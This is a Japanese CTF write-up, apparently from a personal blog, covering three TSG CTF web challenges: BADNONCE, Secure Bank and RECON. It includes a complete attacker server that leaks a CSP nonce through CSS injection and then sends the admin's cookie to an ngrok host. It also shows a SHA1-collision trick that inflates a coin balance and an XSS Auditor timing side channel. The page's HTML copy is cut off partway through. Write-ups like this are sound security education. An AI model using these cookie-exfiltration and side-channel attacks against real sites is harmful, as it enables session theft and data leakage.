{"pageProps":{"article":{"type":"article","slug":"27","body":"[TSG CTF](https://ctftime.org/event/758)にチームNaruseJunで出ました。4099ptsを獲得して3位でした。\n\n[TSG CTF](https://ctftime.org/event/758)\n\n私はWeb問のみを解きました。以下write-upです。\n\n# BADNONCE Part 1 (247pts)\n\nCSPが有効になっているページでXSSしてCookieを盗ってください、という問題でした。\n\n```html\n<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'nonce-<?= $nonce ?>';\">\n```\n\n問題名が **BADNONCE** なので明らかにnonceの実装が悪そうです。\n実際、以下のようにセッションIDに対してnonceが固定なので、これが漏れるとXSSが可能になります。\n\n```php\nsession_start();\n$nonce = md5(session_id());\n```\n\n件のnonceは、ページ内の要素の属性として存在しています。\n\n```html\n<script nonce=<?= $nonce ?>>\n\t\t\t\tconsole.log('Welcome to the dungeon :-)');\n</script>\n```\n\nところで、このページでは`script-src`のみ制限されているので、たとえばスタイルシートなどは外部ソースから読み込み放題です。\nしたがって、CSS Injectionが可能です。セレクタを工夫することによって、要素の属性値を特定することができますね。\n\n[CSS Injection 再入門 – やっていく気持ち](https://diary.shift-js.info/css-injection/)\n\nただし、管理者のブラウザを模したクローラは、毎回異なるPHPSESSIDを持つため、1度の起動で最後までnonceを抜きとって、XSSを踏ませるところまでやらないといけません。\nちょっと面倒ですが、管理者に攻撃車が用意したURLをIFRAMEで開き続けるページを踏ませて、InjectするCSSを変えながら、最終的にXSSを発火させるようにしました。\n以下のような実装になりました。Web問のExploitにしてはちょっと重めかも。もっと頭のいい方法が存在する可能性もあり。\n\n```php\n<?php\n\tif (array_key_exists(\"save\", $_GET)) {\n\t\tfile_put_contents(\"flag.txt\", $_GET[\"save\"] . PHP_EOL, LOCK_EX | FILE_APPEND);\n\t}\n\telse if (array_key_exists(\"nonce\", $_GET)) {\n\t\t$nonce = file_get_contents(\"nonce.txt\");\n\t\tif (strlen($nonce) < strlen($_GET[\"nonce\"])) {\n\t\t\tfile_put_contents(\"nonce.txt\", $_GET[\"nonce\"], LOCK_EX);\n\t\t}\n\t}\n\telse if (array_key_exists(\"css\", $_GET)) {\n\t\theader(\"Content-Type: text/css\");\n\t\techo(\"script { display: block }\" . PHP_EOL);\n\n\t\t$nonce = file_get_contents(\"nonce.txt\");\n\t\t$chars = str_split(\"0123456789abcdef\");\n\n\t\tforeach ($chars as $c1) {\n\t\t\tforeach ($chars as $c2) {\n\t\t\t\t$x = $nonce . $c1 . $c2;\n\t\t\t\techo(\"[nonce^='\" . $x . \"'] { background: url(http://cf07fd07.ap.ngrok.io/?nonce=\" . $x . \") }\" . PHP_EOL);\n\t\t\t}\n\t\t}\n\t}\n\telse if (array_key_exists(\"go\", $_GET)) {\n\t\t$nonce = file_get_contents(\"nonce.txt\");\n\t\tif (strlen($nonce) < 32) {\n\t\t\theader(\"Location: http://35.187.214.138:10023/?q=%3Clink%20rel%3D%22stylesheet%22%20href%3D%22http%3A%2F%2Fcf07fd07.ap.ngrok.io%2F%3Fcss%3D\" . microtime(true) . \"%22%3E\");\n\t\t}\n\t\telse {\n\t\t\theader(\"Location: http://35.187.214.138:10023/?q=%3Cscript%20nonce%3D%22\" . $nonce . \"%22%3Efetch(%22http%3A%2F%2Fcf07fd07.ap.ngrok.io%2F%3Fsave%3D%22%20%2B%20encodeURIComponent(document.cookie))%3C%2Fscript%3E\");\n\t\t}\n\t}\n\telse if (array_key_exists(\"start\", $_GET)) {\n\t\tfile_put_contents(\"nonce.txt\", \"\", LOCK_EX);\n\t\tfile_put_contents(\"flag.txt\", \"\", LOCK_EX);\n?>\n<html>\n<body>\n<script>\n\tsetInterval(() => {\n\t\tconst iframe = document.createElement(\"iframe\");\n\t\tiframe.src = `?go=${(new Date).getTime()}`;\n\t\tdocument.body.appendChild(iframe);\n\t}, 256);\n</script>\n</body>\n</html>\n<?php\n\t}\n\telse {\n\t\techo(\"E R R O R !\");\n\t}\n?>\n```\n\n# Secure Bank (497pts)\n\nrubyで書かれたアプリケーションで、コインの送受信ができます。\nたくさんのコインを集めれば、FLAGが入手できるようです。\n\n```ruby\n  get '/api/flag' do\n    return err(401, 'login first') unless user = session[:user]\n\n    hashed_user = STRETCH.times.inject(user){|s| Digest::SHA1.hexdigest(s)}\n\n    res = DB.query 'SELECT balance FROM account WHERE user = ?', hashed_user\n    row = res.next\n    balance = row && row[0]\n    res.close\n\n    return err(401, 'login first') unless balance\n    return err(403, 'earn more coins!!!') unless balance >= 10_000_000_000\n\n    json({flag: IO.binread('data/flag.txt')})\n  end\n```\n\n怪しいのは送金コードで、こういう形。\n\n```ruby\n  post '/api/transfer' do\n    return err(401, 'login first') unless src = session[:user]\n\n    return err(400, 'bad request') unless dst = params[:target] and String === dst and dst != src\n    return err(400, 'bad request') unless amount = params[:amount] and String === amount\n    return err(400, 'bad request') unless amount = amount.to_i and amount > 0\n\n    sleep 1\n\n    hashed_src = STRETCH.times.inject(src){|s| Digest::SHA1.hexdigest(s)}\n    hashed_dst = STRETCH.times.inject(dst){|s| Digest::SHA1.hexdigest(s)}\n\n    res = DB.query 'SELECT balance FROM account WHERE user = ?', hashed_src\n    row = res.next\n    balance_src = row && row[0]\n    res.close\n    return err(422, 'no enough coins') unless balance_src >= amount\n\n    res = DB.query 'SELECT balance FROM account WHERE user = ?', hashed_dst\n    row = res.next\n    balance_dst = row && row[0]\n    res.close\n    return err(422, 'no such user') unless balance_dst\n\n    balance_src -= amount\n    balance_dst += amount\n\n    DB.execute 'UPDATE account SET balance = ?  WHERE user = ?', balance_src, hashed_src\n    DB.execute 'UPDATE account SET balance = ?  WHERE user = ?', balance_dst, hashed_dst\n\n    json({amount: amount, balance: balance_src})\n  end\n```\n\nぱっと見たところ、トランザクションを考慮していないので、高頻度でリクエストを飛ばせばRace Conditionで二重送金ができそうだったんですが、軽く試したところ、タイミングがシビアでほとんどうまくいかなかったので、この方針は諦めました。\n\nところで、このコードをもう少しよく見ると、宛先と送金元が同一のユーザであったとき、コインが増殖することは明らかです。\nもちろん、自分自身への送金はエラーになる実装となっているんですが、残高の照会をユーザ名をハッシュした値で行っているのに対して、ユーザの同一性判定は元の文字列で行っています。\nつまりは、別の文字列であって、SHA1ハッシュの結果が同一になる文字列の組がもし存在すれば、無限にコインを増やすことができそうです。\n\nSHA1の衝突といえば……[SHAttered](https://shattered.io/)ですよね。\n詳しい理屈はググってもらうとして、これを用いれば、先に述べた要件を満たすような文字列（というかバイト列）の組が用意できます。\n\nJSONとしてnon-printableな文字を送る際に破壊されないように注意しつつ、以下のようにして用意しました。\n\n```php\n<?php\n\t$s1 = file_get_contents(\"shattered-1.pdf\");\n\t$s2 = file_get_contents(\"shattered-2.pdf\");\n\n\t$t1 = substr($s1, 0, 320) . \"narusejun\";\n\t$t2 = substr($s2, 0, 320) . \"narusejun\";\n\n\techo(sha1($t1) . PHP_EOL);\n\techo(sha1($t2) . PHP_EOL);\n\n\tfunction toStr($c) {\n\t\t$i = ord($c);\n\t\tif ($c == '\"') {\n\t\t\treturn '\\\\\"';\n\t\t}\n\t\tif ($c == '%') {\n\t\t\treturn '%%';\n\t\t}\n\t\tif ($i < 0x20) {\n\t\t\treturn sprintf(\"\\\\u%04x\", $i);\n\t\t}\n\t\tif ($i < 0x7F) {\n\t\t\treturn $c;\n\t\t}\n\t\treturn sprintf(\"\\\\x%02x\", ord($c));\n\t}\n\t$u1 = implode(array_map(toStr, str_split($t1)));\n\t$u2 = implode(array_map(toStr, str_split($t2)));\n\n\techo($u1 . PHP_EOL);\n\techo($u2 . PHP_EOL);\n?>\n```\n\nこの文字列のどちらかを使って登録した上で、もう一方の文字列を宛先として指定して送金すると、コインが増殖します。\ncurlを使うと容易です。\n\n# RECON (500pts)\n\nWeb問です。PHPで実装された、プロフィールを登録できるサービスです。\n秘密の質問として20種類のフルーツが好きか否かを選択できるようになっていて、どうやらadminの好きなフルーツをRECONすれば良いみたいです。\n\nソースコードを見ると、自身のプロフィールを確認するページで露骨にCSPが弱められていて、怪しさがあります。\n\n```php\n$response->withHeader(\"Content-Security-Policy\", \"script-src-elem 'self'; script-src-attr 'unsafe-inline'; style-src 'self'\")\n```\n\nこの要素は新しい機能なので、`script-src-elem`と`script-src-attr`が効いていなくて、実質XSSし放題になっているようでした。\nしかしながら、このページはログインしたユーザ自身のプロフィールを表示するものですので、狙った相手にコードを実行させるのは厳しそうな雰囲気があります。\n\nところで、そもそも何故`script-src-attr`などという特殊な(?)制限が付されているのでしょうか？\nこの答えは、このページのソースを注意深く見るとすぐに気が付きました。\n\n```html\n🍇 <input type=\"checkbox\" id=\"grapes\" onchange=\"grapes.checked=false;\" >\n🍈 <input type=\"checkbox\" id=\"melon\" onchange=\"melon.checked=false;\" >\n🍉 <input type=\"checkbox\" id=\"watermelon\" onchange=\"watermelon.checked=false;\" >\n🍊 <input type=\"checkbox\" id=\"tangerine\" onchange=\"tangerine.checked=false;\" >\n🍋 <input type=\"checkbox\" id=\"lemon\" onchange=\"lemon.checked=false;\" >\n🍌 <input type=\"checkbox\" id=\"banana\" onchange=\"banana.checked=false;\" >\n🍍 <input type=\"checkbox\" id=\"pineapple\" onchange=\"pineapple.checked=false;\" >\n🍐 <input type=\"checkbox\" id=\"pear\" onchange=\"pear.checked=false;\" >\n🍑 <input type=\"checkbox\" id=\"peach\" onchange=\"peach.checked=false;\" >\n🍒 <input type=\"checkbox\" id=\"cherries\" onchange=\"cherries.checked=false;\" >\n🍓 <input type=\"checkbox\" id=\"strawberry\" onchange=\"strawberry.checked=false;\" >\n🍅 <input type=\"checkbox\" id=\"tomato\" onchange=\"tomato.checked=false;\" >\n🥥 <input type=\"checkbox\" id=\"coconut\" onchange=\"coconut.checked=false;\" >\n🥭 <input type=\"checkbox\" id=\"mango\" onchange=\"mango.checked=false;\" >\n🥑 <input type=\"checkbox\" id=\"avocado\" onchange=\"avocado.checked=false;\" >\n🍆 <input type=\"checkbox\" id=\"aubergine\" onchange=\"aubergine.checked=false;\" >\n🥔 <input type=\"checkbox\" id=\"potato\" onchange=\"potato.checked=false;\" >\n🥕 <input type=\"checkbox\" id=\"carrot\" onchange=\"carrot.checked=false;\" >\n🥦 <input type=\"checkbox\" id=\"broccoli\" onchange=\"broccoli.checked=false;\" >\n🍄 <input type=\"checkbox\" id=\"mushroom\" onchange=\"mushroom.checked=false;\" >\n```\n\n秘密の質問がプロフィールページに表示されているんですが、この変更を禁止する目的でJavaScriptが用いられているのでした！\nこのコードのみ実行できるようにする目的で、部分的なunsafe-inlineが許容されていたようです。\n\nもし、この小さなJavaScriptコードを盗むことができれば、adminの好きなフルーツを知ることできそうです。\nこのページでは、`X-XSS-Protection: 1; mode=block`というヘッダが送信されていて、XSS Auditorがブロックモードで動作することが期待されていて、adminのブラウザもこれに従っているでしょう。\nこういう場合に、XSS Auditorの誤検出を利用して、ページ内のスクリプトを盗む手法が存在します。\n\n[ブラウザのXSSフィルタを利用した情報窃取攻撃 | MBSD Blog](https://www.mbsd.jp/blog/20160407_2.html)\n\nこれを利用できそうです。（できました。）\n以下のような2つのIFRAMEを表示させれば、どちらか一方をXSS Auditorがブロックするはずです。\n\n```html\n<iframe src='http://34.97.74.235:10033/profile?onchange=\"melon.checked=true;\"'></iframe>\n<iframe src='http://34.97.74.235:10033/profile?onchange=\"melon.checked=false;\"'></iframe>\n```\n\nこの性質を利用し、攻撃者のページで2つのIFRAMEを開かせて、どちらがブロックされたかを判別すれば良いですね。\nIFRAME要素の`contentWindow.length`を見ると、XSS Auditorが作動したか否かを簡単に判別できるようでしたが、手元で試したときに何故かうまくいかなかったので（これは勘違いだったかもしれませんが）、`onload`が発火するまでの時間を計測するちょっと面倒な方法で判別しています。\nXSS Auditorが作動すると、関連リソースの読み込みが走らないので、`onload`が早く呼ばれるはずです。\n\n以下のように実装し、IFRAMEをプロフィールに埋め込んで、adminにアクセスさせました。\nJavaScriptの記法モダンだったりレガシーだったりしていて、気持ち悪いんですが、終了ギリギリで解いていたためいろいろ焦っていて、見当違いの試行錯誤をしていた名残です。\n\n```php\n<?php\n\tif(array_key_exists(\"save\", $_GET)){\n\t\tfile_put_contents(\"save.txt\", $_GET[\"save\"] . PHP_EOL, FILE_APPEND | LOCK_EX);\n\t\techo(\"OK!\");\n\t}else{\n?>\n<html>\n<body>\n<script>\n\nfunction test(key, val){\n\treturn new Promise(function(resolve){\n\t\tconst iframe = document.createElement(\"iframe\");\n\t\tiframe.onload = function(){\n\t\t\tiframe.remove();\n\t\t\tresolve([key, val, new Date().getTime() - time]);\n\t\t};\n\t\tiframe.src = `http://34.97.74.235:10033/profile?onchange=\"${key}.checked=${val};\"`;\n\t\tconst time = new Date().getTime();\n\t\tdocument.body.appendChild(iframe);\n\t});\n}\n\n(async () => {\n\tconst results = [];\n\tfor(let i = 0; i < 1; i++){\n\t\tresults.push([\n\t\t\tawait test(\"mushroom\", true),\n\t\t\tawait test(\"mushroom\", false),\n\t\t]);\n\t}\n\tlocation.href = \"?save=\" + results;\n})();\n</script>\n</body>\n</html>\n<?php\n\t}\n?>\n```\n\nこれを用いて、フルーツ1種類ごとに計測した結果が以下のとおりです。\nCaptchaを連打する必要があって、激ツラかったです。チームメイトにひたすらCaptchaしてもらいました。（もっと頭の良い実装をすればよかった気もしますが。）\n\n| フルーツ | trueのonload(ms)| falseのonload(ms) | 判定結果 |\n| --- | --- | --- | --- |\n| grapes | 84 | 334 | TRUE |\n| melon | 347 | 65 | FALSE |\n| watermelon | 245 | 47 | FALSE |\n| tangerine | 78 | 394 | TRUE |\n| lemon | 83 | 418 | TRUE |\n| banana | 73 | 255 | TRUE |\n| pineapple | 79 | 452 | TRUE |\n| pear | 252 | 48 | FALSE |\n| peach | 74 | 281 | TRUE |\n| cherries | 76 | 336 | TRUE |\n| strawberry | 79 | 318 | TRUE |\n| tomato | 77 | 353 | TRUE |\n| coconut | 77 | 333 | TRUE |\n| mango | 92 | 404 | TRUE |\n| avocado | 254 | 47 | FALSE |\n| aubergine | 85 | 333 | TRUE |\n| potato | 249 | 46 | FALSE |\n| carrot | 72 | 321 | TRUE |\n| broccoli | 428 | 40 | FALSE |\n| mushroom | 87 | 388 | TRUE |\n\nあとは、この結果を用いてadminのrecoveryメッセージ（FLAG）を表示させることができました。\n\n# 総括\n\nWeb問しか触っていないので他のジャンルはわかりかねますが、良い問題でした。\n\n- 誘導が適切で、guessが最小限で済んだ\n- 扱っているテーマも面白いものだった\n\nおわりです。\nなんか💰を貰えるらしいので、焼肉にでも行きたいです🐦\n\nhttps://twitter.com/tsgctf/status/1124933926202560512\n","title":"TSG CTF write-up (Web)","image":null,"tags":["CTF","参加記"],"date":"2019-05-05T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},"description":"TSG CTFにチームNaruseJunで出ました。4099ptsを獲得して3位でした。 TSG CTF 私はWeb問のみを解きました。以下write-upです。 BADNONCE Part 1 (…","content":"<p><a href=https://ctftime.org/event/758 rel=\"noopener noreferrer\"target=_blank>TSG CTF</a>にチームNaruseJunで出ました。4099ptsを獲得して3位でした。<aside><a href=https://ctftime.org/event/758/ rel=\"noopener noreferrer\"target=_blank style=background-image:url(https://ctftime.org/static/images/ct/logo.svg)><div><strong>TSG CTF</strong><cite>ctftime.org</cite><q cite=https://ctftime.org/event/758/>TSG is the official computer society of The University of Tokyo, and also the name of the CTF team organized by its m...</q></div></a></aside><p>私はWeb問のみを解きました。以下write-upです。<h1>BADNONCE Part 1 (247pts)</h1><p>CSPが有効になっているページでXSSしてCookieを盗ってください、という問題でした。<pre><code class=\"hljs language-html\"><span class=hljs-tag>&lt;<span class=hljs-name>meta</span> <span class=hljs-attr>http-equiv</span>=<span class=hljs-string>\"Content-Security-Policy\"</span> <span class=hljs-attr>content</span>=<span class=hljs-string>\"script-src 'nonce-&#60?= $nonce ?>';\"</span>></span>\n</code></pre><p>問題名が <strong>BADNONCE</strong> なので明らかにnonceの実装が悪そうです。 実際、以下のようにセッションIDに対してnonceが固定なので、これが漏れるとXSSが可能になります。<pre><code class=\"hljs language-php\">session_start();\n<span class=hljs-variable>$nonce</span> = md5(session_id());\n</code></pre><p>件のnonceは、ページ内の要素の属性として存在しています。<pre><code class=\"hljs language-html\"><span class=hljs-tag>&lt;<span class=hljs-name>script</span> <span class=hljs-attr>nonce</span>=&#60?= <span class=hljs-string>$nonce</span> ?></span><span class=javascript>>\n\t\t\t\t<span class=hljs-built_in>console</span>.log(<span class=hljs-string>'Welcome to the dungeon :-)'</span>);\n</span><span class=hljs-tag>&#60/<span class=hljs-name>script</span>></span>\n</code></pre><p>ところで、このページでは<code>script-src</code>のみ制限されているので、たとえばスタイルシートなどは外部ソースから読み込み放題です。 したがって、CSS Injectionが可能です。セレクタを工夫することによって、要素の属性値を特定することができますね。<aside><a href=https://diary.shift-js.info/css-injection/ rel=\"noopener noreferrer\"target=_blank style=background-image:url(https://b.st-hatena.com/images/v4/public/entry-button/button-only@2x.png)><div><strong>CSS Injection 再入門</strong><cite>diary.shift-js.info</cite><q cite=https://diary.shift-js.info/css-injection/>本稿はセキュリティキャンプ 修了生進捗 #seccamp OB/OG Advent Calendar 2018 の 17 日目として書かれた記事です。一時期よく話題に上がっていた CSS Injection を, 改めて眺め直してみたいと思います。</q></div></a></aside><p>ただし、管理者のブラウザを模したクローラは、毎回異なるPHPSESSIDを持つため、1度の起動で最後までnonceを抜きとって、XSSを踏ませるところまでやらないといけません。 ちょっと面倒ですが、管理者に攻撃車が用意したURLをIFRAMEで開き続けるページを踏ませて、InjectするCSSを変えながら、最終的にXSSを発火させるようにしました。 以下のような実装になりました。Web問のExploitにしてはちょっと重めかも。もっと頭のいい方法が存在する可能性もあり。<pre><code class=\"hljs language-php\"><span class=hljs-meta>&#60?php</span>\n\t<span class=hljs-keyword>if</span> (array_key_exists(<span class=hljs-string>\"save\"</span>, <span class=hljs-variable>$_GET</span>)) {\n\t\tfile_put_contents(<span class=hljs-string>\"flag.txt\"</span>, <span class=hljs-variable>$_GET</span>[<span class=hljs-string>\"save\"</span>] . PHP_EOL, LOCK_EX | FILE_APPEND);\n\t}\n\t<span class=hljs-keyword>else</span> <span class=hljs-keyword>if</span> (array_key_exists(<span class=hljs-string>\"nonce\"</span>, <span class=hljs-variable>$_GET</span>)) {\n\t\t<span class=hljs-variable>$nonce</span> = file_get_contents(<span class=hljs-string>\"nonce.txt\"</span>);\n\t\t<span class=hljs-keyword>if</span> (strlen(<span class=hljs-variable>$nonce</span>) &#60 strlen(<span class=hljs-variable>$_GET</span>[<span class=hljs-string>\"nonce\"</span>])) {\n\t\t\tfile_put_contents(<span class=hljs-string>\"nonce.txt\"</span>, <span class=hljs-variable>$_GET</span>[<span class=hljs-string>\"nonce\"</span>], LOCK_EX);\n\t\t}\n\t}\n\t<span class=hljs-keyword>else</span> <span class=hljs-keyword>if</span> (array_key_exists(<span class=hljs-string>\"css\"</span>, <span class=hljs-variable>$_GET</span>)) {\n\t\theader(<span class=hljs-string>\"Content-Type: text/css\"</span>);\n\t\t<span class=hljs-keyword>echo</span>(<span class=hljs-string>\"script { display: block }\"</span> . PHP_EOL);\n\n\t\t<span class=hljs-variable>$nonce</span> = file_get_contents(<span class=hljs-string>\"nonce.txt\"</span>);\n\t\t<span class=hljs-variable>$chars</span> = str_split(<span class=hljs-string>\"0123456789abcdef\"</span>);\n\n\t\t<span class=hljs-keyword>foreach</span> (<span class=hljs-variable>$chars</span> <span class=hljs-keyword>as</span> <span class=hljs-variable>$c1</span>) {\n\t\t\t<span class=hljs-keyword>foreach</span> (<span class=hljs-variable>$chars</span> <span class=hljs-keyword>as</span> <span class=hljs-variable>$c2</span>) {\n\t\t\t\t<span class=hljs-variable>$x</span> = <span class=hljs-variable>$nonce</span> . <span class=hljs-variable>$c1</span> . <span class=hljs-variable>$c2</span>;\n\t\t\t\t<span class=hljs-keyword>echo</span>(<span class=hljs-string>\"[nonce^='\"</span> . <span class=hljs-variable>$x</span> . <span class=hljs-string>\"'] { background: url(http://cf07fd07.ap.ngrok.io/?nonce=\"</span> . <span class=hljs-variable>$x</span> . <span class=hljs-string>\") }\"</span> . PHP_EOL);\n\t\t\t}\n\t\t}\n\t}\n\t<span class=hljs-keyword>else</span> <span class=hljs-keyword>if</span> (array_key_exists(<span class=hljs-string>\"go\"</span>, <span class=hljs-variable>$_GET</span>)) {\n\t\t<span class=hljs-variable>$nonce</span> = file_get_contents(<span class=hljs-string>\"nonce.txt\"</span>);\n\t\t<span class=hljs-keyword>if</span> (strlen(<span class=hljs-variable>$nonce</span>) &#60 <span class=hljs-number>32</span>) {\n\t\t\theader(<span class=hljs-string>\"Location: http://35.187.214.138:10023/?q=%3Clink%20rel%3D%22stylesheet%22%20href%3D%22http%3A%2F%2Fcf07fd07.ap.ngrok.io%2F%3Fcss%3D\"</span> . microtime(<span class=hljs-literal>true</span>) . <span class=hljs-string>\"%22%3E\"</span>);\n\t\t}\n\t\t<span class=hljs-keyword>else</span> {\n\t\t\theader(<span class=hljs-string>\"Location: http://35.187.214.138:10023/?q=%3Cscript%20nonce%3D%22\"</span> . <span class=hljs-variable>$nonce</span> . <span class=hljs-string>\"%22%3Efetch(%22http%3A%2F%2Fcf07fd07.ap.ngrok.io%2F%3Fsave%3D%22%20%2B%20encodeURIComponent(document.cookie))%3C%2Fscript%3E\"</span>);\n\t\t}\n\t}\n\t<span class=hljs-keyword>else</span> <span class=hljs-keyword>if</span> (array_key_exists(<span class=hljs-string>\"start\"</span>, <span class=hljs-variable>$_GET</span>)) {\n\t\tfile_put_contents(<span class=hljs-string>\"nonce.txt\"</span>, <span class=hljs-string>\"\"</span>, LOCK_EX);\n\t\tfile_put_contents(<span class=hljs-string>\"flag.txt\"</span>, <span class=hljs-string>\"\"</span>, LOCK_EX);\n<span class=hljs-meta>?></span>\n&#60html>\n&#60body>\n&#60script>\n\tsetInterval(() => {\n\t\t<span class=hljs-keyword>const</span> iframe = document.createElement(<span class=hljs-string>\"iframe\"</span>);\n\t\tiframe.src = `?go=${(<span class=hljs-keyword>new</span> Date).getTime()}`;\n\t\tdocument.body.appendChild(iframe);\n\t}, <span class=hljs-number>256</span>);\n&#60/script>\n&#60/body>\n&#60/html>\n<span class=hljs-meta>&#60?php</span>\n\t}\n\t<span class=hljs-keyword>else</span> {\n\t\t<span class=hljs-keyword>echo</span>(<span class=hljs-string>\"E R R O R !\"</span>);\n\t}\n<span class=hljs-meta>?></span>\n</code></pre><h1>Secure Bank (497pts)</h1><p>rubyで書かれたアプリケーションで、コインの送受信ができます。 たくさんのコインを集めれば、FLAGが入手できるようです。<pre><code class=\"hljs language-ruby\">  get <span class=hljs-string>'/api/flag'</span> <span class=hljs-keyword>do</span>\n    <span class=hljs-keyword>return</span> err(<span class=hljs-number>401</span>, <span class=hljs-string>'login first'</span>) <span class=hljs-keyword>unless</span> user = session[<span class=hljs-symbol>:user</span>]\n\n    hashed_user = STRETCH.times.inject(user){<span class=hljs-params>|s|</span> Digest::SHA1.hexdigest(s)}\n\n    res = DB.query <span class=hljs-string>'SELECT balance FROM account WHERE user = ?'</span>, hashed_user\n    row = res.<span class=hljs-keyword>next</span>\n    balance = row &#38&#38 row[<span class=hljs-number>0</span>]\n    res.close\n\n    <span class=hljs-keyword>return</span> err(<span class=hljs-number>401</span>, <span class=hljs-string>'login first'</span>) <span class=hljs-keyword>unless</span> balance\n    <span class=hljs-keyword>return</span> err(<span class=hljs-number>403</span>, <span class=hljs-string>'earn more coins!!!'</span>) <span class=hljs-keyword>unless</span> balance >= <span class=hljs-number>10_000_000_000</span>\n\n    json({<span class=hljs-symbol>flag:</span> IO.binread(<span class=hljs-string>'data/flag.txt'</span>)})\n  <span class=hljs-keyword>end</span>\n</code></pre><p>怪しいのは送金コードで、こういう形。<pre><code class=\"hljs language-ruby\">  post <span class=hljs-string>'/api/transfer'</span> <span class=hljs-keyword>do</span>\n    <span class=hljs-keyword>return</span> err(<span class=hljs-number>401</span>, <span class=hljs-string>'login first'</span>) <span class=hljs-keyword>unless</span> src = session[<span class=hljs-symbol>:user</span>]\n\n    <span class=hljs-keyword>return</span> err(<span class=hljs-number>400</span>, <span class=hljs-string>'bad request'</span>) <span class=hljs-keyword>unless</span> dst = params[<span class=hljs-symbol>:target</span>] <span class=hljs-keyword>and</span> String === dst <span class=hljs-keyword>and</span> dst != src\n    <span class=hljs-keyword>return</span> err(<span class=hljs-number>400</span>, <span class=hljs-string>'bad request'</span>) <span class=hljs-keyword>unless</span> amount = params[<span class=hljs-symbol>:amount</span>] <span class=hljs-keyword>and</span> String === amount\n    <span class=hljs-keyword>return</span> err(<span class=hljs-number>400</span>, <span class=hljs-string>'bad request'</span>) <span class=hljs-keyword>unless</span> amount = amount.to_i <span class=hljs-keyword>and</span> amount > <span class=hljs-number>0</span>\n\n    sleep <span class=hljs-number>1</span>\n\n    hashed_src = STRETCH.times.inject(src){<span class=hljs-params>|s|</span> Digest::SHA1.hexdigest(s)}\n    hashed_dst = STRETCH.times.inject(dst){<span class=hljs-params>|s|</span> Digest::SHA1.hexdigest(s)}\n\n    res = DB.query <span class=hljs-string>'SELECT balance FROM account WHERE user = ?'</span>, hashed_src\n    row = res.<span class=hljs-keyword>next</span>\n    balance_src = row &#38&#38 row[<span class=hljs-number>0</span>]\n    res.close\n    <span class=hljs-keyword>return</span> err(<span class=hljs-number>422</span>, <span class=hljs-string>'no enough coins'</span>) <span class=hljs-keyword>unless</span> balance_src >= amount\n\n    res = DB.query <span class=hljs-string>'SELECT balance FROM account WHERE user = ?'</span>, hashed_dst\n    row = res.<span class=hljs-keyword>next</span>\n    balance_dst = row &#38&#38 row[<span class=hljs-number>0</span>]\n    res.close\n    <span class=hljs-keyword>return</span> err(<span class=hljs-number>422</span>, <span class=hljs-string>'no such user'</span>) <span class=hljs-keyword>unless</span> balance_dst\n\n    balance_src -= amount\n    balance_dst += amount\n\n    DB.execute <span class=hljs-string>'UPDATE account SET balance = ?  WHERE user = ?'</span>, balance_src, hashed_src\n    DB.execute <span class=hljs-string>'UPDATE account SET balance = ?  WHERE user = ?'</span>, balance_dst, hashed_dst\n\n    json({<span class=hljs-symbol>amount:</span> amount, <span class=hljs-symbol>balance:</span> balance_src})\n  <span class=hljs-keyword>end</span>\n</code></pre><p>ぱっと見たところ、トランザクションを考慮していないので、高頻度でリクエストを飛ばせばRace Conditionで二重送金ができそうだったんですが、軽く試したところ、タイミングがシビアでほとんどうまくいかなかったので、この方針は諦めました。<p>ところで、このコードをもう少しよく見ると、宛先と送金元が同一のユーザであったとき、コインが増殖することは明らかです。 もちろん、自分自身への送金はエラーになる実装となっているんですが、残高の照会をユーザ名をハッシュした値で行っているのに対して、ユーザの同一性判定は元の文字列で行っています。 つまりは、別の文字列であって、SHA1ハッシュの結果が同一になる文字列の組がもし存在すれば、無限にコインを増やすことができそうです。<p>SHA1の衝突といえば……<a href=https://shattered.io/ rel=\"noopener noreferrer\"target=_blank>SHAttered</a>ですよね。 詳しい理屈はググってもらうとして、これを用いれば、先に述べた要件を満たすような文字列（というかバイト列）の組が用意できます。<p>JSONとしてnon-printableな文字を送る際に破壊されないように注意しつつ、以下のようにして用意しました。<pre><code class=\"hljs language-php\"><span class=hljs-meta>&#60?php</span>\n\t<span class=hljs-variable>$s1</span> = file_get_contents(<span class=hljs-string>\"shattered-1.pdf\"</span>);\n\t<span class=hljs-variable>$s2</span> = file_get_contents(<span class=hljs-string>\"shattered-2.pdf\"</span>);\n\n\t<span class=hljs-variable>$t1</span> = substr(<span class=hljs-variable>$s1</span>, <span class=hljs-number>0</span>, <span class=hljs-number>320</span>) . <span class=hljs-string>\"narusejun\"</span>;\n\t<span class=hljs-variable>$t2</span> = substr(<span class=hljs-variable>$s2</span>, <span class=hljs-number>0</span>, <span class=hljs-number>320</span>) . <span class=hljs-string>\"narusejun\"</span>;\n\n\t<span class=hljs-keyword>echo</span>(sha1(<span class=hljs-variable>$t1</span>) . PHP_EOL);\n\t<span class=hljs-keyword>echo</span>(sha1(<span class=hljs-variable>$t2</span>) . PHP_EOL);\n\n\t<span class=hljs-function><span class=hljs-keyword>function</span> <span class=hljs-title>toStr</span>(<span class=hljs-params><span class=hljs-variable>$c</span></span>) </span>{\n\t\t<span class=hljs-variable>$i</span> = ord(<span class=hljs-variable>$c</span>);\n\t\t<span class=hljs-keyword>if</span> (<span class=hljs-variable>$c</span> == <span class=hljs-string>'\"'</span>) {\n\t\t\t<span class=hljs-keyword>return</span> <span class=hljs-string>'\\\\\"'</span>;\n\t\t}\n\t\t<span class=hljs-keyword>if</span> (<span class=hljs-variable>$c</span> == <span class=hljs-string>'%'</span>) {\n\t\t\t<span class=hljs-keyword>return</span> <span class=hljs-string>'%%'</span>;\n\t\t}\n\t\t<span class=hljs-keyword>if</span> (<span class=hljs-variable>$i</span> &#60 <span class=hljs-number>0x20</span>) {\n\t\t\t<span class=hljs-keyword>return</span> sprintf(<span class=hljs-string>\"\\\\u%04x\"</span>, <span class=hljs-variable>$i</span>);\n\t\t}\n\t\t<span class=hljs-keyword>if</span> (<span class=hljs-variable>$i</span> &#60 <span class=hljs-number>0x7F</span>) {\n\t\t\t<span class=hljs-keyword>return</span> <span class=hljs-variable>$c</span>;\n\t\t}\n\t\t<span class=hljs-keyword>return</span> sprintf(<span class=hljs-string>\"\\\\x%02x\"</span>, ord(<span class=hljs-variable>$c</span>));\n\t}\n\t<span class=hljs-variable>$u1</span> = implode(array_map(toStr, str_split(<span class=hljs-variable>$t1</span>)));\n\t<span class=hljs-variable>$u2</span> = implode(array_map(toStr, str_split(<span class=hljs-variable>$t2</span>)));\n\n\t<span class=hljs-keyword>echo</span>(<span class=hljs-variable>$u1</span> . PHP_EOL);\n\t<span class=hljs-keyword>echo</span>(<span 